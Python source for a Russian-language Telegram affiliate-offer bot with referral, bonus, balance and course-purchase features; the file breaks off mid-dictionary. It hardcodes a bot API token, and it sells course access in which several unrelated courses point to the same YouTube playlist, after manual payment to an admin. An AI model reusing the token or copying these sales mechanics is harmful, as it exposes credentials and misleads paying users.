print("🚀 БОТ ЗАПУСКАЕТСЯ...")

import os
import sys
import logging
import asyncio

# ФИКС ДЛЯ Python 3.13
if sys.version_info >= (3, 13):
    print("Python 3.13 - применяю фикс...")
    import types
    imghdr = types.ModuleType('imghdr')
    imghdr.what = lambda x: None
    sys.modules['imghdr'] = imghdr

# НОВЫЙ ИМПОРТ ДЛЯ python-telegram-bot v20+
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    ContextTypes,
    filters
)

print("✅ Библиотеки загружены")

# ====================== КОНФИГУРАЦИЯ ======================
TOKEN = "8256725006:AAFV-2zx2OWxQdAP0Nxe9k4lYzq7_ofnyIw"
ADMIN_ID = 7979729060
ADMIN_USERNAME = "@profitclickadmin"

# Настройка логирования
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)

logger = logging.getLogger(__name__)

# ====================== БАЗА ДАННЫХ ======================
from datetime import datetime, timedelta
import json

class SimpleDB:
    def __init__(self):
        self.data = {}
    
    def get(self, user_id, key, default=None):
        if user_id not in self.data:
            self.data[user_id] = {}
        return self.data[user_id].get(key, default)
    
    def set(self, user_id, key, value):
        if user_id not in self.data:
            self.data[user_id] = {}
        self.data[user_id][key] = value
    
    def add(self, user_id, key, amount):
        current = self.get(user_id, key, 0)
        self.set(user_id, key, current + amount)
        return current + amount
    
    def has(self, user_id, key):
        return self.get(user_id, key, False)
    
    def append(self, user_id, key, value):
        """Добавить элемент в список"""
        if user_id not in self.data:
            self.data[user_id] = {}
        if key not in self.data[user_id]:
            self.data[user_id][key] = []
        if not isinstance(self.data[user_id][key], list):
            self.data[user_id][key] = []
        self.data[user_id][key].append(value)
    
    def get_list(self, user_id, key):
        """Получить список"""
        if user_id not in self.data:
            self.data[user_id] = {}
        if key not in self.data[user_id]:
            self.data[user_id][key] = []
        return self.data[user_id].get(key, [])

db = SimpleDB()

# ====================== ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ ======================
def add_transaction(user_id, transaction_type, amount, description=""):
    """Добавить транзакцию в историю"""
    transaction = {
        "date": datetime.now().isoformat(),
        "type": transaction_type,
        "amount": amount,
        "description": description
    }
    db.append(user_id, "transactions", transaction)
    return transaction

def get_referral_code(user_id):
    """Получить или создать реферальный код"""
    code = db.get(user_id, "referral_code")
    if not code:
        code = f"REF{user_id}"
        db.set(user_id, "referral_code", code)
    return code

def get_referrer(user_id):
    """Получить ID реферера пользователя"""
    return db.get(user_id, "referred_by")

def add_referral(referrer_id, referred_id):
    """Добавить реферала"""
    db.append(referrer_id, "referrals", referred_id)
    db.set(referred_id, "referred_by", referrer_id)
    
    # Бонус рефереру
    bonus = 50
    db.add(referrer_id, "balance", bonus)
    add_transaction(referrer_id, "referral", bonus, f"Бонус за приглашение пользователя {referred_id}")
    
    # Бонус новому пользователю
    db.add(referred_id, "balance", 25)
    add_transaction(referred_id, "bonus", 25, "Бонус за регистрацию по реферальной ссылке")
    
    return bonus

def check_daily_bonus(user_id):
    """Проверить и выдать ежедневный бонус"""
    today = datetime.now().date().isoformat()
    last_bonus_date = db.get(user_id, "last_daily_bonus_date")
    streak = db.get(user_id, "daily_streak", 0)
    
    if last_bonus_date == today:
        return None, streak
    
    yesterday = (datetime.now() - timedelta(days=1)).date().isoformat()
    
    if last_bonus_date == yesterday:
        streak += 1
    else:
        streak = 1
    
    bonus = min(10 + (streak * 5), 100)
    
    db.set(user_id, "last_daily_bonus_date", today)
    db.set(user_id, "daily_streak", streak)
    db.add(user_id, "balance", bonus)
    add_transaction(user_id, "bonus", bonus, f"Ежедневный бонус (стрик: {streak} дней)")
    
    return bonus, streak

def check_achievements(user_id):
    """Проверить и выдать достижения"""
    balance = db.get(user_id, "balance", 0)
    completed_tasks = len(db.get_list(user_id, "completed_tasks"))
    referrals_count = len(db.get_list(user_id, "referrals"))
    achievements = db.get_list(user_id, "achievements")
    new_achievements = []
    
    if balance >= 1000000 and "millionaire" not in achievements:
        achievements.append("millionaire")
        new_achievements.append("💰 Миллионер")
        db.add(user_id, "balance", 1000)
        add_transaction(user_id, "bonus", 1000, "Награда за достижение: Миллионер")
    
    if balance >= 100000 and "rich" not in achievements:
        achievements.append("rich")
        new_achievements.append("💵 Богач")
        db.add(user_id, "balance", 500)
        add_transaction(user_id, "bonus", 500, "Награда за достижение: Богач")
    
    if balance >= 10000 and "wealthy" not in achievements:
        achievements.append("wealthy")
        new_achievements.append("💴 Состоятельный")
        db.add(user_id, "balance", 200)
        add_transaction(user_id, "bonus", 200, "Награда за достижение: Состоятельный")
    
    if completed_tasks >= 1 and "first_task" not in achievements:
        achievements.append("first_task")
        new_achievements.append("🎯 Первое задание")
        db.add(user_id, "balance", 50)
        add_transaction(user_id, "bonus", 50, "Награда за достижение: Первое задание")
    
    if completed_tasks >= 100 and "task_master" not in achievements:
        achievements.append("task_master")
        new_achievements.append("🏆 Мастер заданий")
        db.add(user_id, "balance", 1000)
        add_transaction(user_id, "bonus", 1000, "Награда за достижение: Мастер заданий")
    
    if completed_tasks >= 50 and "task_pro" not in achievements:
        achievements.append("task_pro")
        new_achievements.append("⭐ Профи заданий")
        db.add(user_id, "balance", 500)
        add_transaction(user_id, "bonus", 500, "Награда за достижение: Профи заданий")
    
    if completed_tasks >= 10 and "task_beginner" not in achievements:
        achievements.append("task_beginner")
        new_achievements.append("🌱 Новичок")
        db.add(user_id, "balance", 100)
        add_transaction(user_id, "bonus", 100, "Награда за достижение: Новичок")
    
    if referrals_count >= 10 and "referral_king" not in achievements:
        achievements.append("referral_king")
        new_achievements.append("👑 Король рефералов")
        db.add(user_id, "balance", 500)
        add_transaction(user_id, "bonus", 500, "Награда за достижение: Король рефералов")
    
    if referrals_count >= 5 and "referral_pro" not in achievements:
        achievements.append("referral_pro")
        new_achievements.append("🤝 Реферальный профи")
        db.add(user_id, "balance", 200)
        add_transaction(user_id, "bonus", 200, "Награда за достижение: Реферальный профи")
    
    db.set(user_id, "achievements", achievements)
    return new_achievements

# ====================== ГЛАВНОЕ МЕНЮ ======================
def main_menu_keyboard():
    keyboard = [
        ["🏆 Задания", "💼 Работа"],
        ["💳 Банковские карты", "💰 Кредиты"],
        ["🛡 Страхование", "🏠 Недвижимость"],
        ["✈️ Туризм и путешествия", "🏢 Бизнес"],
        ["📊 Брокерские счета", "🌟 Подписки"],
        ["📱 SIM-карты", "🎓 Курсы"],
        ["💰 Баланс", "📞 Связь с админом"],
        ["🎁 Ежедневный бонус", "👤 Профиль"]
    ]
    return ReplyKeyboardMarkup(keyboard, resize_keyboard=True)

# ====================== КОМАНДЫ ======================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    balance = db.get(user.id, "balance", 0)
    
    if context.args and len(context.args) > 0:
        ref_code = context.args[0]
        if ref_code.startswith("REF"):
            try:
                referrer_id = int(ref_code[3:])
                if referrer_id != user.id and not get_referrer(user.id):
                    add_referral(referrer_id, user.id)
            except:
                pass
    
    new_achievements = check_achievements(user.id)
    
    welcome_text = f"👋 Привет, {user.first_name}!\n\n"
    welcome_text += f"💰 Твой баланс: {balance}₽\n\n"
    
    if new_achievements:
        welcome_text += "🎉 **Новые достижения:**\n"
        for ach in new_achievements:
            welcome_text += f"✅ {ach}\n"
        welcome_text += "\n"
    
    welcome_text += "Я бот-помощник по партнерским программам.\n"
    welcome_text += "Выберите категорию из меню ниже:"
    
    await update.message.reply_text(
        welcome_text,
        reply_markup=main_menu_keyboard(),
        parse_mode='Markdown'
    )

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        f"📞 По всем вопросам: {ADMIN_USERNAME}\n\n"
        "📋 Как работает бот:\n"
        "1. Выберите категорию\n2. Перейдите по ссылке\n"
        "3. Выполните задание\n4. Нажмите 'Выполнил задание'\n"
        "5. Отправьте данные\n\n💰 Все выплаты через администратора.",
        reply_markup=main_menu_keyboard()
    )

# ====================== АДМИН КОМАНДЫ ======================
async def add_balance(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    
    if user.id != ADMIN_ID:
        await update.message.reply_text("❌ У вас нет прав для выполнения этой команды.")
        return
    
    if not context.args:
        await update.message.reply_text(
            "💰 **Выдача баланса**\n\n"
            "Использование:\n"
            "/addbalance <сумма> - выдать себе баланс\n"
            "/addbalance <сумма> <user_id> - выдать баланс пользователю\n\n"
            "Примеры:\n"
            "/addbalance 1000 - выдать себе 1000₽\n"
            "/addbalance 500 123456789 - выдать 500₽ пользователю с ID 123456789",
            parse_mode='Markdown'
        )
        return
    
    try:
        amount = int(context.args[0])
        
        if len(context.args) > 1:
            target_user_id = int(context.args[1])
            db.add(target_user_id, "balance", amount)
            new_balance = db.get(target_user_id, "balance", 0)
            add_transaction(target_user_id, "deposit", amount, "Пополнение баланса администратором")
            
            await update.message.reply_text(
                f"✅ Баланс выдан!\n\n"
                f"👤 Пользователь ID: {target_user_id}\n"
                f"💰 Выдано: {amount}₽\n"
                f"📊 Новый баланс: {new_balance}₽"
            )
            
            try:
                await context.bot.send_message(
                    chat_id=target_user_id,
                    text=f"💰 Вам начислено {amount}₽\n\nВаш баланс: {new_balance}₽"
                )
            except:
                pass
        else:
            db.add(user.id, "balance", amount)
            new_balance = db.get(user.id, "balance", 0)
            add_transaction(user.id, "deposit", amount, "Пополнение баланса администратором")
            
            await update.message.reply_text(
                f"✅ Баланс выдан!\n\n"
                f"💰 Выдано: {amount}₽\n"
                f"📊 Ваш баланс: {new_balance}₽"
            )
    
    except ValueError:
        await update.message.reply_text("❌ Неверный формат! Используйте числа.\nПример: /addbalance 1000", parse_mode='Markdown')
    except Exception as e:
        await update.message.reply_text(f"❌ Ошибка: {e}")
        logger.error(f"Ошибка в add_balance: {e}")

# ====================== БАЛАНС ======================
async def balance_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    balance = db.get(user.id, "balance", 0)
    
    keyboard = [
        [InlineKeyboardButton("💳 Пополнить баланс", callback_data="deposit")],
        [InlineKeyboardButton("📊 История операций", callback_data="history")],
        [InlineKeyboardButton("🏠 Главное меню", callback_data="main_menu")]
    ]
    
    await update.message.reply_text(
        f"💰 **Твой баланс:** {balance}₽\n\n"
        "Выберите действие:",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='Markdown'
    )

async def deposit_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    keyboard = [
        [InlineKeyboardButton("50₽", callback_data="deposit_50")],
        [InlineKeyboardButton("100₽", callback_data="deposit_100")],
        [InlineKeyboardButton("500₽", callback_data="deposit_500")],
        [InlineKeyboardButton("1000₽", callback_data="deposit_1000")],
        [InlineKeyboardButton("◀️ Назад", callback_data="balance_menu")]
    ]
    
    await query.edit_message_text(
        "💳 **Пополнение баланса**\n\n"
        "Выберите сумму для пополнения:\n\n"
        "⚠️ *Внимание:* Пока что пополнение через администратора.\n"
        f"Напишите: {ADMIN_USERNAME}\n\n"
        "После оплаты администратор зачислит средства на ваш баланс.",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='Markdown'
    )

# ====================== ИСТОРИЯ ОПЕРАЦИЙ ======================
async def history_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    if query:
        await query.answer()
        user_id = query.from_user.id
    else:
        user_id = update.effective_user.id
    
    transactions = db.get_list(user_id, "transactions")
    
    if not transactions:
        text = "📊 **История операций**\n\n"
        text += "У вас пока нет операций."
        keyboard = [[InlineKeyboardButton("◀️ Назад", callback_data="balance_menu")]]
        
        if query:
            await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
        else:
            await update.message.reply_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
        return
    
    recent_transactions = transactions[-10:][::-1]
    text = "📊 **История операций**\n\n"
    text += f"Всего операций: {len(transactions)}\n\n"
    
    type_icons = {
        "deposit": "💳",
        "withdraw": "💸",
        "bonus": "🎁",
        "referral": "🤝",
        "purchase": "🛒"
    }
    
    type_names = {
        "deposit": "Пополнение",
        "withdraw": "Списание",
        "bonus": "Бонус",
        "referral": "Реферал",
        "purchase": "Покупка"
    }
    
    for trans in recent_transactions:
        date = datetime.fromisoformat(trans["date"]).strftime("%d.%m.%Y %H:%M")
        icon = type_icons.get(trans["type"], "💰")
        type_name = type_names.get(trans["type"], trans["type"])
        amount = trans["amount"]
        sign = "+" if amount > 0 else ""
        
        text += f"{icon} {date}\n"
        text += f"{type_name}: {sign}{amount}₽\n"
        
        if trans.get("description"):
            text += f" {trans['description']}\n"
        text += "\n"
    
    keyboard = [
        [InlineKeyboardButton("◀️ Назад", callback_data="balance_menu")]
    ]
    
    if query:
        await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
    else:
        await update.message.reply_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')

# ====================== РЕФЕРАЛЬНАЯ СИСТЕМА ======================
async def referral_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_id = user.id
    
    referral_code = get_referral_code(user_id)
    referrals = db.get_list(user_id, "referrals")
    
    bot_info = await context.bot.get_me()
    referral_link = f"https://t.me/{bot_info.username}?start={referral_code}"
    
    total_earned = sum([t["amount"] for t in db.get_list(user_id, "transactions") if t.get("type") == "referral"])
    
    text = "🤝 **Реферальная система**\n\n"
    text += f"📎 Ваша реферальная ссылка:\n{referral_link}\n\n"
    text += f"👥 Приглашено друзей: {len(referrals)}\n"
    text += f"💰 Заработано на рефералах: {total_earned}₽\n\n"
    text += "💡 За каждого приглашенного друга вы получаете 50₽!\n"
    text += "А ваш друг получает 25₽ бонусом при регистрации.\n\n"
    text += "📊 **Топ рефералов:**\n"
    
    all_users = db.data.keys()
    referral_stats = []
    
    for uid in all_users:
        refs = db.get_list(uid, "referrals")
        if refs:
            referral_stats.append((uid, len(refs)))
    
    referral_stats.sort(key=lambda x: x[1], reverse=True)
    top_referrals = referral_stats[:5]
    
    for i, (uid, count) in enumerate(top_referrals, 1):
        if uid == user_id:
            text += f"{i}. 👤 Вы - {count} рефералов ⭐\n"
        else:
            text += f"{i}. 👤 Пользователь {uid} - {count} рефералов\n"
    
    keyboard = [
        [InlineKeyboardButton("📋 Скопировать ссылку", callback_data="copy_referral")],
        [InlineKeyboardButton("◀️ Назад", callback_data="profile_menu")]
    ]
    
    await update.message.reply_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')

# ====================== ЕЖЕДНЕВНЫЕ БОНУСЫ ======================
async def daily_bonus(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_id = user.id
    
    bonus, streak = check_daily_bonus(user_id)
    
    if bonus is None:
        streak = db.get(user_id, "daily_streak", 0)
        balance = db.get(user.id, "balance", 0)
        
        text = "🎁 **Ежедневный бонус**\n\n"
        text += "❌ Вы уже получили бонус сегодня!\n\n"
        text += f"🔥 Стрик: {streak} дней подряд\n"
        text += f"💰 Ваш баланс: {balance}₽\n\n"
        text += "⏰ Приходите завтра за новым бонусом!"
    else:
        balance = db.get(user.id, "balance", 0)
        
        text = "🎁 **Ежедневный бонус**\n\n"
        text += f"✅ Вы получили {bonus}₽!\n\n"
        text += f"🔥 Стрик: {streak} дней подряд\n"
        text += f"💰 Ваш баланс: {balance}₽\n\n"
        
        if streak >= 7:
            text += "🌟 Отличный стрик! Продолжайте в том же духе!\n"
        elif streak >= 3:
            text += "💪 Хороший стрик! Не останавливайтесь!\n"
        
        text += "\n💡 Чем больше дней подряд, тем больше бонус!"
        
        new_achievements = check_achievements(user_id)
        if new_achievements:
            text += "\n\n🎉 **Новые достижения:**\n"
            for ach in new_achievements:
                text += f"✅ {ach}\n"
    
    keyboard = [
        [InlineKeyboardButton("🏠 Главное меню", callback_data="main_menu")]
    ]
    
    await update.message.reply_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')

# ====================== ПРОФИЛЬ ПОЛЬЗОВАТЕЛЯ ======================
async def profile_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_id = user.id
    
    balance = db.get(user_id, "balance", 0)
    completed_tasks = len(db.get_list(user_id, "completed_tasks"))
    referrals = db.get_list(user_id, "referrals")
    achievements = db.get_list(user_id, "achievements")
    streak = db.get(user_id, "daily_streak", 0)
    transactions = db.get_list(user_id, "transactions")
    
    total_earned = sum([t["amount"] for t in transactions if t["amount"] > 0])
    total_spent = abs(sum([t["amount"] for t in transactions if t["amount"] < 0]))
    
    text = f"👤 **Профиль {user.first_name}**\n\n"
    text += f"💰 Баланс: {balance}₽\n"
    text += f"📊 Всего заработано: {total_earned}₽\n"
    text += f"💸 Всего потрачено: {total_spent}₽\n\n"
    text += f"✅ Выполнено заданий: {completed_tasks}\n"
    text += f"🤝 Приглашено друзей: {len(referrals)}\n"
    text += f"🔥 Стрик ежедневных бонусов: {streak} дней\n"
    text += f"🏆 Достижений: {len(achievements)}\n\n"
    
    if achievements:
        text += "**Ваши достижения:**\n"
        achievement_names = {
            "first_task": "🎯 Первое задание",
            "task_beginner": "🌱 Новичок",
            "task_pro": "⭐ Профи заданий",
            "task_master": "🏆 Мастер заданий",
            "wealthy": "💴 Состоятельный",
            "rich": "💵 Богач",
            "millionaire": "💰 Миллионер",
            "referral_pro": "🤝 Реферальный профи",
            "referral_king": "👑 Король рефералов"
        }
        for ach in achievements:
            text += f"✅ {achievement_names.get(ach, ach)}\n"
        text += "\n"
    
    referral_code = get_referral_code(user_id)
    bot_info = await context.bot.get_me()
    referral_link = f"https://t.me/{bot_info.username}?start={referral_code}"
    
    text += f"🔗 Реферальная ссылка:\n{referral_link}\n"
    
    keyboard = [
        [InlineKeyboardButton("📊 История операций", callback_data="history")],
        [InlineKeyboardButton("🤝 Реферальная система", callback_data="referral_menu")],
        [InlineKeyboardButton("🏆 Все достижения", callback_data="all_achievements")],
        [InlineKeyboardButton("🏠 Главное меню", callback_data="main_menu")]
    ]
    
    await update.message.reply_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')

async def all_achievements_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    user_id = query.from_user.id
    user_achievements = db.get_list(user_id, "achievements")
    
    all_achievements = {
        "first_task": {"name": "🎯 Первое задание", "desc": "Выполните первое задание"},
        "task_beginner": {"name": "🌱 Новичок", "desc": "Выполните 10 заданий"},
        "task_pro": {"name": "⭐ Профи заданий", "desc": "Выполните 50 заданий"},
        "task_master": {"name": "🏆 Мастер заданий", "desc": "Выполните 100 заданий"},
        "wealthy": {"name": "💴 Состоятельный", "desc": "Накопите 10,000₽"},
        "rich": {"name": "💵 Богач", "desc": "Накопите 100,000₽"},
        "millionaire": {"name": "💰 Миллионер", "desc": "Накопите 1,000,000₽"},
        "referral_pro": {"name": "🤝 Реферальный профи", "desc": "Пригласите 5 друзей"},
        "referral_king": {"name": "👑 Король рефералов", "desc": "Пригласите 10 друзей"}
    }
    
    text = "🏆 **Все достижения**\n\n"
    
    for ach_id, ach_info in all_achievements.items():
        if ach_id in user_achievements:
            text += f"✅ {ach_info['name']} - {ach_info['desc']}\n"
        else:
            text += f"❌ {ach_info['name']} - {ach_info['desc']}\n"
    
    keyboard = [
        [InlineKeyboardButton("◀️ Назад в профиль", callback_data="profile_menu")]
    ]
    
    await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')

# ====================== КУРСЫ ======================
COURSES = {
    "course_1": {
        "title": "🎨 Основы графического дизайна",
        "price": 50,
        "description": "Базовый курс по графическому дизайну для начинающих",
        "link": "https://www.youtube.com/playlist?list=PLsN1dVlmYW53XYkAwa4Q87ikr5qepwdRM"
    },
    "course_2": {
        "title": "📸 Фотошоп с Нуля",
        "price": 100,
        "description": "Полный курс Adobe Photoshop для новичков",
        "link": "https://www.youtube.com/playlist?list=PL_jKgaFUK_61p1yXULw7KPi6HGpyXKTWx"
    },
    "course_3": {
        "title": "🐍 Python для начинающих",
        "price": 80,
        "description": "Полный курс Python с нуля - программирование для новичков",
        "link": "https://www.youtube.com/playlist?list=PLQAt0m1f9OHvv6XVvo38T5YqoX_6BMvJh"
    },
    "course_4": {
        "title": "💻 JavaScript с нуля",
        "price": 120,
        "description": "Изучи JavaScript за 10 часов - полный курс для новичков",
        "link": "https://www.youtube.com/playlist?list=PLqKQF2ojwm3l4oPjsB9chrJmlhZ-zOzWT"
    },
    "course_5": {
        "title": "🎬 Видеомонтаж в Premiere Pro",
        "price": 150,
        "description": "Профессиональный видеомонтаж в Adobe Premiere Pro с нуля",
        "link": "https://www.youtube.com/playlist?list=PLQAt0m1f9OHs8_ZeJ95fjK4dN3jAqO1qK"
    },
    "course_6": {
        "title": "📱 Разработка мобильных приложений",
        "price": 180,
        "description": "Создание приложений для Android и iOS с нуля",
        "link": "https://www.youtube.com/playlist?list=PLQAt0m1f9OHvyjJNjzc_1E6gd4E-tvFhR"
    },
    "course_7": {
        "title": "🌐 Веб-разработка HTML/CSS",
        "price": 70,
        "description": "Создание сайтов с нуля - HTML, CSS, основы верстки",
        "link": "https://www.youtube.com/playlist?list=PLM6XATr8gcRl5n6vq7lS2vK6jXvJN4qKZ"
    },
    "course_8": {
        "title": "📊 Excel для бизнеса",
        "price": 90,
        "description": "Продвинутый Excel: формулы, графики, анализ данных",
        "link": "https://www.youtube.com/playlist?list=PLQAt0m1f9OHs8_ZeJ95fjK4dN3jAqO1qK"
    },
    "course_9": {
        "title": "🎯 SMM и продвижение в соцсетях",
        "price": 130,
        "description": "Как продвигать бизнес в Instagram, VK, Telegram",
        "link": "https://www.youtube.com/playlist?list=PLQAt0m1f9OHvyjJNjzc_1E6gd4E-tvFhR"
    },
    "course_10": {
        "title": "💰 Криптовалюты и блокчейн",
        "price": 200,
        "description": "Полный курс по криптовалютам, блокчейну и инвестициям",
        "link": "https://www.youtube.com/playlist?list=PLQAt0m1f9OHs8_ZeJ95fjK4dN3jAqO1qK"
    },
    "course_11": {
        "title": "🎨 Figma для дизайнеров",
        "price": 110,
        "description": "Профессиональный дизайн интерфейсов в Figma с нуля",
        "link": "https://www.youtube.com/playlist?list=PLQAt0m1f9OHvyjJNjzc_1E6gd4E-tvFhR"
    },
    "course_12": {
        "title": "🤖 Машинное обучение и AI",
        "price": 190,
        "description": "Введение в искусственный интеллект и машинное обучение",
        "link": "https://www.youtube.com/playlist?list=PLQAt0m1f9OHs8_ZeJ95fjK4dN3jAqO1qK"
    }
}

async def courses_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = []
    for course_id, course in COURSES.items():
        keyboard.append([
            InlineKeyboardButton(
                f"{course['title']} - {course['price']}₽",
                callback_data=f"view_course_{course_id}"
            )
        ])
    
    keyboard.append([InlineKeyboardButton("🏠 Главное меню", callback_data="main_menu")])
    
    await update.message.reply_text(
        "🎓 **Доступные курсы:**\n\n"
        "Выберите курс для покупки:",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='Markdown'
    )

async def buy_course(update: Update, context: ContextTypes.DEFAULT_TYPE, course_id):
    query = update.callback_query
    user = query.from_user
    
    if not query:
        return
    
    await query.answer()
    
    course = COURSES[course_id]
    
    if db.has(user.id, f"course_{course_id}"):
        await query.answer("✅ У вас уже есть этот курс!", show_alert=True)
        await query.edit_message_text(
            f"🎓 **{course['title']}**\n\n"
            f"💰 Цена: {course['price']}₽\n\n"
            f"📚 Ссылка на курс:\n{course['link']}\n\n"
            "✅ Вы уже приобрели этот курс!",
            parse_mode='Markdown'
        )
        return
    
    balance = db.get(user.id, "balance", 0)
    
    if balance >= course['price']:
        db.add(user.id, "balance", -course['price'])
        db.set(user.id, f"course_{course_id}", True)
        add_transaction(user.id, "purchase", -course['price'], f"Покупка курса: {course['title']}")
        
        admin_msg = (
            f"🎓 НОВАЯ ПОКУПКА КУРСА\n\n"
            f"👤 Пользователь: @{user.username}\n"
            f"💳 Курс: {course['title']}\n"
            f"💰 Сумма: {course['price']}₽\n"
            f"📊 Новый баланс: {db.get(user.id, 'balance', 0)}₽"
        )
        
        try:
            await context.bot.send_message(chat_id=ADMIN_ID, text=admin_msg)
        except Exception as e:
            logger.error(f"Ошибка отправки сообщения админу: {e}")
        
        await query.edit_message_text(
            f"🎉 **Поздравляем с покупкой!**\n\n"
            f"🎓 **{course['title']}**\n\n"
            f"💰 Спиcано: {course['price']}₽\n"
            f"📊 Новый баланс: {db.get(user.id, 'balance', 0)}₽\n\n"
            f"🔗 **Ссылка на курс:**\n{course['link']}\n\n"
            "Приятного обучения! 🚀",
            parse_mode='Markdown'
        )
    else:
        await query.answer("❌ Недостаточно средств!", show_alert=True)
        await query.edit_message_text(
            f"🎓 **{course['title']}**\n\n"
            f"💰 Цена: {course['price']}₽\n"
            f"📊 Ваш баланс: {balance}₽\n\n"
            "❌ Недостаточно средств для покупки!\n"
            f"💳 Пополните баланс через меню '💰 Баланс'",
            parse_mode='Markdown'
        )

# ====================== ВСЕ ЗАДАНИЯ ======================
TASK_DATA = {
    "task_1": {
        "title": "Лендинг с заданиями и наградами",
        "link": "https://yandex.ru/project/browser/bonus/multioffer/affiliate_4prod?source=pWRP8eS1VsC2X59560&partner_string=P89XvN11U6RuE47077&cliddbro=14444288&clidmbro=14444289&cliddefault=14444291&clidpp=14444285",
        "description": "Выполните задания и получите награды от Яндекса",
        "category": "Задания"
    },
    "task_2": {
        "title": "Яндекс.Браузер на ПК – до 500₽ за установку",
        "link": "https://download.cdn.yandex.net/yandex-tag/weboffer/YandexDownloader.exe?partner=946133&yabrowser=y&yaqsearch=y&yahomepage=y&banerid=1314444296&clid1=14444293&clid5=14444286&clid6=14444287&clid8=14444284&hash=4665b8e76c413b00338cf14156dfe0ed&.exe",
        "description": "Установите Яндекс.Браузер на ПК и получите до 500₽",
        "category": "Задания"
    },
    "task_3": {
        "title": "Яндекс.Браузер на смартфон – до 200₽",
        "link": "https://redirect.appmetrica.yandex.com/serve/1038458303094476620?partner_id=831050&appmetrica_js_redirect=0&full=0&clid=14444292&banerid=1314444290",
        "description": "Установите Яндекс.Браузер на смартфон и получите до 200₽",
        "category": "Задания"
    },
    "task_4": {
        "title": "Яндекс.Поиск – 15% дохода от рекламы",
        "link": "https://ya.ru/search/?clid=14444295&text=",
        "description": "Подключите поиск Яндекса и получайте 15% дохода от рекламы",
        "category": "Задания"
    },
    "task_5": {
        "title": "Яндекс.Приложение с Алисой – 150₽ за установку",
        "link": "https://redirect.appmetrica.yandex.com/serve/1110515897115706063?clid=14444294&appmetrica_js_redirect=0",
        "description": "Установите приложение Яндекс с Алисой и получите 150₽",
        "category": "Задания"
    },
    "job_1": {
        "title": "Яндекс.Курьер",
        "link": "https://ya.cc/8Ro9Lk",
        "description": "Требования: Телефон Android 7+ или iPhone, мед. книжка",
        "category": "Работа"
    },
    "job_2": {
        "title": "Стать партнёром Альфа-Банк",
        "link": "https://svoy.alfabank.ru/ref/885537",
        "description": "Доход 50 000–100 000 ₽ в месяц",
        "category": "Работа"
    },
    "job_3": {
        "title": "Брокер Альфа-Банк – ЗП 500-1 000 000₽",
        "link": "https://alfabank.ru/make-money/investments/brokerskij-schyot/?platformId=alfapartners_msv_investment-ba_885537_3469359",
        "description": "Требования: Понимание финансовых инструментов",
        "category": "Работа"
    },
    "card_1": {
        "title": "T-BANK Дебетовая карта Black 500₽",
        "link": "https://tbank.ru/baf/AGH0q6iLOEi",
        "description": "Оформите карту и получите 500₽",
        "category": "Банковские карты"
    },
    "card_2": {
        "title": "T-BANK Исламская карта 700₽",
        "link": "https://tbank.ru/baf/Ahw0N0HVPr5",
        "description": "Оформите карту и получите 700₽",
        "category": "Банковские карты"
    },
    "card_3": {
        "title": "ALL Airlines Debit 500₽",
        "link": "https://trk.ppdu.ru/click/dQ6F5iXw?erid=2SDnjeBaaR6",
        "description": "Оформите карту и получите 500₽",
        "category": "Банковские карты"
    },
    "card_4": {
        "title": "T-BANK Кредитная карта Platinum 500₽",
        "link": "https://tbank.ru/baf/7UJLwbFRVjE",
        "description": "Оформите карту и получите 500₽",
        "category": "Банковские карты"
    },
    "card_5": {
        "title": "ПСБ Банк 'Твой Кешбэк' 700₽",
        "link": "https://trk.ppdu.ru/click/WBiFitrR?erid=2SDnjehD1C8",
        "description": "Оформите карту и получите 700₽",
        "category": "Банковские карты"
    },
    "card_6": {
        "title": "ВТБ Банк Кредитная карта 2000₽",
        "link": "https://trk.ppdu.ru/click/GRSeIMLG?erid=2SDnjeGCc2T",
        "description": "Оформите карту и получите 2000₽",
        "category": "Банковские карты"
    },
    "card_7": {
        "title": "Плати по миру Виртуальная карта USD 5000₽",
        "link": "https://trk.ppdu.ru/click/1HeoyraF?erid=2SDnjdQghsC",
        "description": "Оформите карту и получите 5000₽",
        "category": "Банковские карты"
    },
    "card_8": {
        "title": "Альфа-Карта с любимым кэшбэком – 4000₽",
        "link": "https://alfabank.ru/lp/retail/dc/flexible-agent/?platformId=alfapartners_msv_DC-flexible_885537_3469097",
        "description": "Все преимущества Альфа-Карты + любимый кэшбэк",
        "category": "Банковские карты"
    },
    "card_9": {
        "title": "Карта к Семейному счёту – 2500₽",
        "link": "https://alfa.me/-iUM8W?url=https%3A%2F%2Fsvoy.alfabank.ru%2Fapi%2Fsso%2Fproxy%3Fproduct_id%3DSK%26id%3D885537&id=885537",
        "description": "Карта для семейного счёта Альфа-Банка",
        "category": "Банковские карты"
    },
    "card_10": {
